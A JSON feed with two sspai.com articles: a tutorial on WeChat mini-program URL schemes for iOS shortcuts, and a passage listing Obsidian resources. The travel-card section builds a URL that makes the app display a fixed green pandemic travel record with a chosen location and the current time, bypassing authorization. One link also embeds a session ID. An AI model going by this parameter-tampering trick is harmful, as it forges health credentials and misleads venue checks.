[{"title":"微信小程序也能一键直达，除了健康码你还想跳转什么？","date":"2021-08-25 09:33:09","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>一直以来，很多用户都希望微信的小程序能够支持 URL Scheme。正好 V2EX 网友 @<a href=\"https://v2ex.com/member/ITisCool\" target=\"_blank\">ITisCool</a> 分享了几条相关的 URL Scheme，根据 <a href=\"https://v2ex.com/t/797533\" target=\"_blank\">文章</a> 分享的方法，作者也构造了一些实用的小程序 URL Scheme。接下来就来看看，如何构造微信小程序的 URL Scheme。</p>\n<p>注：本身依托于文章<a href=\"https://sspai.com/post/66334\" target=\"_blank\">《URL Scheme 查询指南》</a>，在 iOS 上，URL Scheme 是用于定位应用内某个页面的类似网址的存在，设置妥当后可被用于快速跳转到应用中的某个页面/功能。</p>\n<p>部分捷径下载地址：<a href=\"https://www.icloud.com/shortcuts/34292418752346c38ba593b91fafbee2\" target=\"_blank\">粤康码</a> <a href=\"https://www.icloud.com/shortcuts/950c3d8068754b229be9d615bf64d6aa\" target=\"_blank\">穗康码</a> <a href=\"https://www.icloud.com/shortcuts/e27fdf1dd15645f7aa4de689b24f5b73\" target=\"_blank\">微信乘车码</a> <a href=\"https://www.icloud.com/shortcuts/7529f11c78574b50ac6577a0477f69ef\" target=\"_blank\">通信行程卡</a> <a href=\"https://www.icloud.com/shortcuts/4ba762c65ff344ab9ebea96b17fcaec6\" target=\"_blank\">深i您健康码</a> <a href=\"https://www.icloud.com/shortcuts/d278981375cc440f8430cae99752f505\" target=\"_blank\">深圳平安门禁</a> <a href=\"https://www.icloud.com/shortcuts/7544fdb8076a4768ad81eb1f99885ca4\" target=\"_blank\">上海随申码</a> <a href=\"https://www.icloud.com/shortcuts/3ca0058db49745a786a9f93a140f6126\" target=\"_blank\">北京健康宝</a> <a href=\"https://www.icloud.com/shortcuts/852093c885a14989b14a5651bf9d44ff\" target=\"_blank\">渝康码</a> <a href=\"https://www.icloud.com/shortcuts/4146495d2cfa414ba8933d5e9523e667\" target=\"_blank\">南昌赣通码</a> <a href=\"https://www.icloud.com/shortcuts/683061bba01143f8990945b2897fae4e\" target=\"_blank\">辽事通</a> <a href=\"https://www.icloud.com/shortcuts/a9eb29f3532e47c18ed30c68464c288a\" target=\"_blank\">八闽健康码</a> <a href=\"weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_72145ecf601b&amp;path=pages/scan/scan.html\" target=\"_blank\">扫张贴码</a></p>\n<p>部分 Launch Center Pro Action 下载：<a href=\"launch://x-callback-url/import?title=%E4%BA%B2%E6%88%9A%E7%A7%B0%E5%91%BC&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_dcbfa5f1ac2e\" target=\"_blank\">亲戚称呼</a> <a href=\"launch://x-callback-url/import?title=%E6%8B%8D%E7%85%A7%E8%AF%86%E8%8A%B1&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_60c5387f05e3%26path%3Dpages/recogNew/recogNew.html\" target=\"_blank\">拍照识花</a> <a href=\"launch://x-callback-url/import?title=%E5%BE%AE%E4%BF%A1%E4%B9%98%E8%BD%A6%E7%A0%81&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_3cf62f4f1d52\" target=\"_blank\">腾讯乘车码</a> <a href=\"launch://x-callback-url/import?title=%E9%80%9A%E4%BF%A1%E8%A1%8C%E7%A8%8B%E5%8D%A1&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_0ed5d82fd775%26path%3Dpages/result/result.html%3Fresult%3D%7B%7B%7B%22color%22%3A%22green%22%2C%22phone%22%3A%2213166666666%22%2C%22time%22%3A%22%5B%5Btextexpander%3Atime%5D%5D%22%2C%22message%22%3A%22%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%8E%86%E7%94%B0%E5%B8%82%22%7D%7D%7D\" target=\"_blank\">通信行程卡</a> <a href=\"launch://x-callback-url/import?title=%E5%85%AB%E9%97%BD%E5%81%A5%E5%BA%B7%E7%A0%81&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_72145ecf601b%26path%3Dpages/index/index.html%3FuserId%3D2c9bc694730bdc8a01730d9ae1b60a8a%26sessionId%3D2c9bc77c7b7499f8017b78f041ce2899\" target=\"_blank\">八闽健康码</a> <a href=\"launch://x-callback-url/import?title=%E6%89%AB%E5%BC%A0%E8%B4%B4%E7%A0%81&amp;url=weixin%3A//app/wxd930ea5d5a258f4f/jumpWxa/%3FuserName%3Dgh_72145ecf601b%26path%3Dpages/scan/scan.html%3FdbId%3D1\" target=\"_blank\">扫张贴码</a></p>\n<h2>信息展示</h2>\n<p>在日常生活中，小程序有很大一部分使用场景都是用于信息的展示。例如出示乘车码、健康码、行程卡等等，尤其疫情当前，进入商场餐厅都必须出示健康码/行程码才能入内。现在的生活里已经离不开了码，所以本次小教程先以信息展示切入，来看看有哪些实际的应用。</p>\n<h3>乘车码</h3>\n<p>虽然不少城市的地铁与公交都已经支持了各种 Pay，但依旧有不少读者习惯使用微信乘车码。以腾讯乘车码为例，打开微信乘车码小程序，点击右上角的「导航」图标，再点击「乘车码」进入乘车码的信息页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a35b34t99b7ntdi0.jpeg\"></figure><p>点击「更多资料」，查看小程序的「账号原始ID」，例如乘车码的 gh_3cf62f4f1d52。记下这串 ID，可以说是乘车码这个小程序的「身份证」。这个步骤相当基础，以下每一个例子都会机遇这个步骤来寻找这串原始 ID。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a3db34t99b7ntdig.jpeg\"></figure><p>有了小程序账号的原始 ID 之后，就可以根据固定的 URL Scheme 格式进行构造了。微信打开小程序的 URL Scheme 格式如下：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=账号原始ID</code></pre>\n<p>其中的「wxd930ea5d5a258f4f」是固定的注册代号，无需更改。依葫芦画瓢，如果各位需要打开某个小程序，只需在 userName 参数后面跟上「原始ID」即可。所以可以构造出乘车码的 URL Scheme，如下所示：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_3cf62f4f1d52</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a3lb34t9a5fkkqlg.gif\"></figure><p>此处演示使用的是我惯用的 Launch Center Pro 跳转，如果读者习惯使用快捷指令，也可以在快捷指令中新建一个动作。新增一个打开 URL 的动作，将 URL Scheme 复制进去，也可以起到一样的效果。快捷指令还可以在桌面微件、背部轻拍等功能中快速启动，这里就交给各位读者老爷们自行发挥啦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a3tb34t9arh0b1og.jpeg\"></figure><h3>车来了</h3>\n<p>除了能够直接打开某个小程序，在研究这个 URL Scheme 的过程中，还有一个意外发现：如果使用 URL Scheme 打开小程序，可以跳过开屏广告，直接进入主页面。使用上述的方法，得到车来了的「原始ID」，我们一样可以顺利构造出打开「车来了」小程序的 URL Scheme。</p>\n<p>但如果我们想更进一步，直接一步到位触达某条公交线路详情页面，那该怎么做呢？</p>\n<p>好在微信也提供了一个 path 参数，可以直接打开指定页面。直达某页面的 URL Scheme 格式如下所示：</p>\n<pre class=\"language-plain text\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=账号原始ID&amp;path=页面路径</code></pre>\n<p>但是问题也随之而来，如何获取页面路径？这就有一定的操作门槛了，如果需要获取页面的路径，需要有一个自己的小程序才能查询到其他小程序的页面路径入口。前往 <a href=\"https://mp.weixin.qq.com/\" target=\"_blank\">微信公众平台</a> 扫码登录，注册一个小程序。注册好之后，点击右上角的「工具」&gt;「生成小程序码」。</p>\n<p>如果你已经注册过公众号的话，我们会在下一个例子里会介绍公众号获取路径的方法，此处注册小程序的步骤可以跳过。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a45b34t9a5fkkqm0.png\"></figure><p>输入要查找的小程序名称，例如此处的「车来了精准实时公交」。此处的搜索不支持模糊搜索，需要输入完整的小程序名称。在输入完成后，点击右边的「搜索」图标，出现搜索结果之后，才可以点击「下一步」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a4db34t9abj2c6cg.png\"></figure><p>点击「获取更多页面路径」按钮，在此处输入自己的微信号，再点击「开启」之后，就可以查询页面路径了。如果开启成功，会在顶部弹出通知，显示「开启入口成功」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a4lb34t9a5fkkqmg.png\"></figure><p>返回车来了小程序，来到需要获取路径的页面，例如此处的 K02 路公交详情页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a4tb34t9abj2c6d0.jpeg\"></figure><p>点击右上角的「更多」按钮，再点击「复制页面路径」，就可以得到 K02 路的页面路径，如下所示：</p>\n<pre class=\"language-apache\"><code>pages/linedetail2/linedetail.html?nextStop={}&amp;line={\"lineId\":\"594166803814\",\"lineName\":\"K02\",\"direction\":0,\"lineNo\":\"r02669\"}&amp;city={\"cityId\":\"051\",\"cityName\":\"莆田\",\"cityVersion\":2,\"isGpsCity\":1,\"isHot\":0,\"isNewCity\":0,\"isSupport\":1,\"pinyin\":\"PuTian\",\"supportSubway\":0,\"wechatFavoriteGray\":0,\"localCityId\":\"051\"}&amp;targetStop={\"couponFlag\":0,\"distanceToSp\":-1,\"lat\":25.4712269632472,\"lng\":119.12347092956134,\"order\":30,\"sId\":\"0594-1425\",\"sn\":\"涵江区教育局\"}</code></pre>\n<p>再通过乘车码中的方法，如法炮制获取打开「车来了」的 URL Scheme，如下所示：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_35bd264ef886</code></pre>\n<p>最后只需要将页面路径拼接到 URL Scheme 后面，即可实现直接打开某个具体页面。页面路径的参数名为 path，复制上述我们获取到的「页面路径」，可构造出如下的 URL Scheme：</p>\n<pre class=\"language-plain text\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_35bd264ef886&amp;path=pages/linedetail2/linedetail.html?nextStop={}&amp;line={\"lineId\":\"594166803814\",\"lineName\":\"K02\",\"direction\":0,\"lineNo\":\"r02669\"}&amp;city={\"cityId\":\"051\",\"cityName\":\"莆田\",\"cityVersion\":2,\"isGpsCity\":1,\"isHot\":0,\"isNewCity\":0,\"isSupport\":1,\"pinyin\":\"PuTian\",\"supportSubway\":0,\"wechatFavoriteGray\":0,\"localCityId\":\"051\"}&amp;targetStop={\"couponFlag\":0,\"distanceToSp\":-1,\"lat\":25.4712269632472,\"lng\":119.12347092956134,\"order\":30,\"sId\":\"0594-1425\",\"sn\":\"涵江区教育局\"}</code></pre>\n<p>将它做成一个 Launch Center Pro 的 Action，将这段 URL Scheme 复制进去，但是运行该 Action 之后我们又遇到了另一个问题，报错提示：「URL cloud not be opened」</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a55b34t9arh0b1p0.jpeg\"></figure><p>如果对 LCP 有一定了解，可以猜到这是因为没有编码导致的。而问题就出在 path 上，在 path 参数的前后分别加上 {{ }}，这是 LCP 它自带的编码语法，这样括号之后即可正常运行，演示效果如下。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a5db34t99b7ntdj0.gif\"></figure><p>如果读者需要使用捷径打开这个 URL Scheme，同样需要使用「URL 编码」模块对 path 参数进行独单编码，然后再将 URL Scheme 和 path 进行拼接，否则会导致无法进入指定的页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a5lb34t9a5fkkqn0.jpeg\"></figure><h3>通信行程卡</h3>\n<p>在之前的文章 <a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a> 下面，有读者评论说：是否有通信行程卡的 URL Scheme？当时对该软件进行解包之后发现，该软件没有注册任何 URL Scheme，自然也就不能通过它打开。但是现在有了小程序的 URL Scheme，那么接下来让我们一起热心地试着来实现这位读者的需求。</p>\n<p>使用上面的方法获得通信行程卡的「原始 ID」，经过 LCP 打开之后效果如下所示。但经过多次实验，发现每次都是需要先同意授权之后，才可以查看行程卡，而且这个授权状态是无法保留的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a65b34t9a5fkkqng.jpeg\"></figure><p>为了能够一步直达行程卡页面，就需要获取通行卡页面的路径。在「车来了」例子中，介绍了使用小程序后台获取地址的方法，但是如果恰好只有公众号，也是可以获取到页面路径的。登录公众号后台，在首页点击新的创作，选择「图文消息」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a6db34t99b7ntdjg.png\"></figure><p>点击顶部提供的「小程序」插入功能，搜索通信行程卡，然后进行下一步操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a6lb34t99b7ntdk0.png\"></figure><p>点击「获取去更多页面路径」，在开启入口处输入自己的微信号，点击开启。成功后会在顶部提示「已开启」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a6lb34t9abj2c6dg.png\"></figure><p>此时，打开通信行程卡小程序，点击更多选项。会在下方的分享菜单中看到「复制页面路径」按钮，点击即可复制，得到的路径如下所示：</p>\n<pre class=\"language-htmlbars\"><code>pages/result/result.html?result={\"color\":\"green\",\"phone\":\"131****3233\",\"time\":\"2021.08.25 08:41:25\",\"message\":\"福建省莆田市\"}</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a6tb34t9a5fkkqo0.png\"></figure><p>将打开通信行程卡的 URL Scheme 和路径进行拼接，得到最终的 URL Scheme 如下：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_0ed5d82fd775&amp;path=pages/result/result.html?result={{{\"color\":\"green\",\"phone\":\"131****6666\",\"time\":\"[[textexpander:time]]\",\"message\":\"福建省莆田市\"}}}</code></pre>\n<p>经过测试，使用这条 URL Scheme 可以直达行程卡页面，无需授权询问。但是也可以看出此处有一个很严重的问题，开发者竟然将参数直接放在了 URL 地址里，用 URL 里的参数来构造行程卡页面。而且这样做时间会被固定死，没办法实时更新。</p>\n<p>此处有两种办法都可以解决这个问题，一是使用捷径的日期模块获取时间，二是使用 LCP 配合 TextExpander 实现。先来看看捷径如何实现，新建一个捷径，使用「URL 编码」模块编码 path 参数值。将 time 的值使用「当前日期」模块替换，点击「当前日期」按钮，日期格式选择「自定」，并将格式选择为 <code>yyyy.MM.dd HH:mm:ss</code> 即可。而后再使用「URL」模块拼接 URL Scheme 和编码后的 path 参数，最后再添加「打开 URL」模块打开拼接后的 URL。</p>\n<p>文字啰里八嗦一大堆，看着挺复杂，但实际上操作起来就那么两步，各位不妨参照下图，或是下载我为大家制作的快捷指令示例熟悉一下。<a href=\"https://www.icloud.com/shortcuts/2f32789dbf974123ba47a69725577814\" target=\"_blank\">通信行程卡捷径下载</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a7db34t9abj2c6e0.jpeg\"></figure><p>如果要使用 LCP 配合 TextExpander 实现，只需要在 TextExpander 中新建一个时间的缩写，再用 LCP 引入缩写标签就可以了。具体方法如下：首先前往 TextExpander，新建一个缩写短语 time，内容为 <code>%Y.%m.%e %date:hh:mm:ss%</code>.如果读者对 LCP 配合 TextExpander 的玩法不太了解，可以阅读 <a href=\"https://sspai.com/post/37709\" target=\"_blank\">这些动作，用 Launch Center Pro 执行依然合适</a> 的第三小节，了解这个玩法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a7lb34t9arh0b1pg.jpeg\"></figure><p>返回 LCP，前往「设置」&gt;「TextExpander」，点击「Update TextExpander Snippets」，这样就可以把设置好的缩写短语引用过来。然后还需要修改 URL Scheme，把原来的时间替换成缩写短语 <code>[[textexpander:time]]</code>，替换后的 URL Scheme 如下：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_0ed5d82fd775&amp;path=pages/result/result.html?result={{{\"color\":\"green\",\"phone\":\"131****6666\",\"time\":\"[[textexpander:time]]\",\"message\":\"福建省莆田市\"}}}</code></pre>\n<p>这样就做到了时间的实时更新，演示效果如下。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a7tb34t99b7ntdkg.gif\"></figure><h2>拍照识别</h2>\n<p>讲完了乘车码、车来了、通信行程卡三个例子后，相信读者也能对这类 URL Scheme 有了一个初步的认识，三个小程序它们实现的都是信息的展示，但不少小程序并不只是起到信息展示的作用，也有不少小程序通过调用手机硬件，来部分实现主 App 中的功能，这其中就有不少学生朋友喜爱的小猿搜题等。接下来就以小猿搜题为例，看看另一种形式的小程序 URL Scheme 玩法。</p>\n<h3>小猿搜题</h3>\n<p>打开小猿搜题小程序，点击「拍照搜题」，这时候可以看到在拍照页面，同样出现了一个「更多」的图标。获取拍照页面的地址，如下所示：</p>\n<pre class=\"language-apache\"><code>pages/camera/camera.html</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a85b34t9abj2c6eg.jpeg\"></figure><p>将拍照页面的地址和打开「小猿搜题」的 URL Scheme 拼接，得到如下 URL Scheme，可以一键直达拍照界面。URL Scheme 如下所示：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_10ba875ac32b&amp;path=pages/camera/camera.html</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a8db34t9a5fkkqog.gif\"></figure><h3>拍照识花</h3>\n<p>将「小猿搜题」的方法如法炮制，也可以得到「识花君」的拍照识花页面的 URL Scheme，如下所示：</p>\n<pre class=\"language-apache\"><code>weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_60c5387f05e3&amp;path=pages/recogNew/recogNew.html\n</code></pre>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a95b34t9a5fkkqp0.gif\"></figure><h3>美团共享单车</h3>\n<p>既然可以拍照识别，那么扫描二维码自然不在话下。日常我们扫码的一个高频场景就是路边扫码开启共享单车，炎炎夏日谁不想赶紧开一辆车跑路呢。但在测试美图的单车扫码页面时遇到了一些麻烦：顶部没有了导航图标，无法获取页面路径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4j0a9lb34t99b7ntdl0.jpeg\"></figure><p>如果某个小程序，它的扫描或者拍照功能是直接使用微信的拍照接口，它就无法做到一键直达。对比刚才的「小猿搜题」和「拍照识花」的例子，它们是构建了自己的拍照页面，才可以获得拍照页面的地址。</p>\n<p>放弃了小程序这条路，解包美团应用可发现了美团扫一扫的 URL Scheme，如果是安装使用官方 App 的页面倒是可以一键直达，扫码开车。美团扫一扫的 URL Scheme 如下所示：</p>\n<pre class=\"language-css\"><code>imeituan://www.meituan.com/scanQRCode</code></pre>\n<h4>URL Scheme 应用</h4>\n<p>有了这些微信 URL Scheme 之后，自然就是如何使用它们，目前常见的一些 URL Scheme 打开方式如下所示：</p>\n<ul>\n<li>做成捷径的小组件</li>\n<li>做成捷径添加到桌面使用</li>\n<li>做成捷径并设置双击背面打开</li>\n<li>做成 Launch Center Pro action</li>\n</ul>\n<p>具体要使用那种方式，这可以根据使用频率来决定，如果是每天都要用的，可以设置为最简单的双击背面打开。一般频率的使用，捷径或者 LCP 都可以考虑，选择合适自己的就可以了。</p>\n<p>除此之外，还可以将它做成一个 Launch Center Pro action，借助 <a href=\"https://sspai.com/post/34961\" target=\"_blank\">LCP 的肌肉记忆优势</a>，可以更方便地使用小程序。如果是像小猿搜题和拍照识花这样低频使用软件，将它添加到 LCP 之后，还更方便查找，不必每次都去搜索查找小程序。</p>\n<p>LCP 的软件图标的获取可以参考 <a href=\"https://sspai.com/post/27234\" target=\"_blank\">提取 Mac OS X / iOS 应用图标的 6 种技巧</a>，建议使用 <a href=\"http://submit.icoicon.com/\" target=\"_blank\">icoicon.com</a> 获取正方形的图标，而不是圆角的图标，如果使用圆角图标，旁边会有黑边。</p>\n<h4>应用场景</h4>\n<p>对个人而言，微信小程序 URL Scheme 可以减少点击次数，直达功能页面。对于低频率使用的小程序，可以直接在 LCP 中新建动作使用，而不必专门下载对应的应用。借助捷径，也可以变相达成 Android 端类似的「将小程序放在桌面」的目的。</p>\n<p>对企业或者商户而言，可以更方便地在 iOS 平台推广自己的产品。以少数派为例，可以直接将 <a href=\"weixin://app/wxd930ea5d5a258f4f/jumpWxa/?userName=gh_de14512926a5&amp;path=packages/goods/detail/index.html?alias=27551qmqgfwe8&amp;banner_id=f.27442871~goods.4~2~2nGQjukq\" target=\"_blank\">PiStore 商品链接</a> 放在网页上，如果读者想要购买产品的话，可以直接点击链接跳转小程序详情页面，让购买产品的过程更加方便。</p>\n<h4>发展对比</h4>\n<p>在以前的文章 <a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a> 中介绍了支付宝小程序的 URL Scheme 地址提取，当时还在想如果微信也能支持该多好。现在微信不仅做到了，而且在我看来它做得还更好。支付宝只能做到打开，而微信更进一步，做到了打开指定页面的功能。</p>\n<p>查阅了一些微信小程序的官方文档，其实微信小程序还支持 query 的参数，但是这需要小程序自身的代码适配。个人认为，如果以后常用的小程序都能做好适配，那么离小程序取代应用，或许就指日可待了。</p>\n<h4>参考资料</h4>\n<ul>\n<li><a href=\"https://v2ex.com/t/797533\" target=\"_blank\">iOS 快捷指令一键打开粤康码、微信乘车码，附 URL Scheme</a></li>\n<li><a href=\"https://smilesoftware.com/textexpander/entry/more-elaborate-date-formatting-with-textexpander\" target=\"_blank\">More Elaborate Date Formatting with TextExpander</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68466"},{"title":"Obsidian 优质中文内容合集","date":"2021-08-25 08:00:00","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>Hi，大家！这篇文章介绍几个 Obsidian 优质的中文内容来源，希望能让你在使用 Obsidian 的路上更加一帆风顺。</p>\n<h2>官方自带帮助文档</h2>\n<p>点击 Obsidian 界面左下角的「？」图标，可以打开官方帮助文档。如果你的语言设置是中文，这个文档也会以中文显示，非常的友好。由于帮助库就内置在了本地，任何时候都可以方便的打开，不需要网络支持。</p>\n<p>官方文档的内容非常丰富。对于新手，可以先看看《由此开始》，其中是对 Obsidian 基本信息的介绍，能让你快速上手。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/22/e0233b109db06075c939c6f7a9319c51.png\"><figcaption>帮助文档</figcaption></figure><p>文档中也有很多参考性资料，例如《格式化你的笔记》中有 Markdown 语法的演示，清晰又全面。想不起某个语法的时候，就可以来这里搜索一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/22/6076656ca1c30147d47351bbbb9f08c2.png\"><figcaption>帮助文档中的 Markdown 教程</figcaption></figure><h2>落山鸡编辑与维护的中文文档</h2>\n<p>🔗 <a href=\"https://publish.obsidian.md/chinesehelp\">Obsidian 中文教程</a></p>\n<p>该文档收集了比较全的 Obsidian 优质文章、教程，你想要的信息源应有尽有。可以说，有了这个文档，你 80%的疑问都会得到解答。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/22/5bd7e5e2e42d61b98186897eac0371cd.png\"><figcaption>落山鸡的Obsidian中文教程网站</figcaption></figure><p>此外，文档内还有一个插件教程合集，检索方便、收录完整；对于比较常见的问题，文档也做了整理并给出比较成熟的解决方案，比如如何同步，社区登不上怎么办等等。</p>\n<p><strong>特别值得一提的是，这份文档本身就是一个 Obsidian 资料库，使用官方的 Obsidian Publish 功能创建为网站并发布。</strong>因此，文档本身就是双链笔记的非常好的实践演示。如果你不知道 Obsidian 的双链能够呈现什么效果，或者不知道该如何给自己的笔记加双链，看到这个文档一定会有豁然开朗之感。</p>\n<p><strong>注：</strong>本文档的维护者 @落山鸡 除了收集 Obsidian 资源供新人查阅之外，本人也热衷写博客。他的博客<a href=\"https://cyddgh.github.io/\">软达通</a>和微信公众号「软通达」会发布一些进阶用法，不妨一并关注。</p>\n<h2>蚕子的 Bilibilil 视频</h2>\n<p>🔗 <a href=\"https://www.bilibili.com/video/BV1qD4y1m7nv\">Obsidian（黑曜石）软件基础操作教程</a></p>\n<p>相比文字，视频的操作演示的优势在于观众能够亲眼看到是怎么操作的，会更直观。</p>\n<p>Obsidian 中文视频内容中，我最推荐蚕子的系列视频，其内容涵盖了入门到进阶各个层次，例如创建笔记、双链、自定义主题等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/106182c83d08230ed9220b3afeeee594.png\"></figure><p>对了，蚕子非常善于用高级功能和插件辅助编辑，他的视频讲了很多「编辑助手」插件的用法。</p>\n<h2>Lillian 的公众号和少数派文章</h2>\n<p>🔗 <a href=\"https://sspai.com/u/4b8zstxp/posts\">LillianWho 的少数派主页</a></p>\n<p>💬 微信公众号「莉莉安备忘录」</p>\n<p>没错，就是本人。我擅长写入门级教程，适合新手阅读，低门槛，易上手。文风上，我更倾向于让新手跟着就能实现文章中的效果，捅破插件的窗户纸，从而让用户能够更好的探索其他进阶用法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/5c8cfb18e4db987ae129e5807021dea0.png\"></figure><h2>Boninall 的知乎专栏</h2>\n<p>🔗 <a href=\"https://www.zhihu.com/column/c_1302994040707948544\">Boninall 的知乎专栏</a></p>\n<p>Boninall（知乎用户名为 AllinBon）的知乎专栏关注 Obsidian 软件使用技巧，内容多是插件推荐，以及插件的进阶用法。Boninall 算是我所知道的写插件最多的博主，许多插件如果你找不到教程，也许翻翻他的专栏会有意外收获。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/2aa88b2863a8c0dc7f9f42133dc8514a.png\"></figure><p>Boninall 的文章特点的在于，并非拘泥于一个插件，而是更多结合工作流体现插件功能的应用。因此，他的文章适合有点基础的用户，可以让人从中获得非常多的灵感。比如，笔者就发现尽管他也用看板插件，但做出的效果跟我仿佛是用两个完全不同的插件做出来的，笔者打算写完这篇就去学习一下。</p>\n<h2>Ryooo 的知乎回答和专栏文章</h2>\n<p>🔗 <a href=\"https://www.zhihu.com/people/rao-yao-47-68\" target=\"_blank\">Ryooo 的知乎主页</a></p>\n<p>Ryooo 本人是在读经管硕士，对信息整理有着较深的见解。他的文章功底深厚，文章较长，建议保存到稍后读软件中食用。如果你对如何整理自己的信息，如何组织文献，如何管理分类，Ryooo 的文章一定会让你大有收获。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/64285a05dc4cc236d5cb1ae7d2f356cc.png\"></figure><p>这里，强烈推荐他的《如何构建笔记系统》，共 2 篇长文，内容从我们需要怎样的笔记入手，说到文献组织的方法，再落实到实际操作：</p>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/23427617/answer/1461195696\">如何构建自己的笔记系统？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/353521308\">如何构建笔记系统-实际操作篇</a></li>\n</ul>\n<p>很少能见到如此成系统的文章来解释「笔记系统」这件事。可以说，这两篇文章的知识量不亚于两本书，16 个章节每篇都可以独立当作一篇「干货类」自媒体文章，而 Ryooo 写出来供免费阅读。耐心看下去，相信你一定会回来感谢我的。</p>\n<h2>插件和主题下载资源库</h2>\n<p>🔗 <a href=\"https://gitee.com/whghcyx/obsidian-plugin\">gitee: obsidian-plugin</a></p>\n<p>由于 GitHub 在国内访问不方便，社区插件和社区主题常常无法加载，这里为大家推荐 Gitee 上一个方便下载的宝地。该项目由 Obsidian 爱好群群友 @宏沉一笑 上传并维护，包含了当前所有社区<a 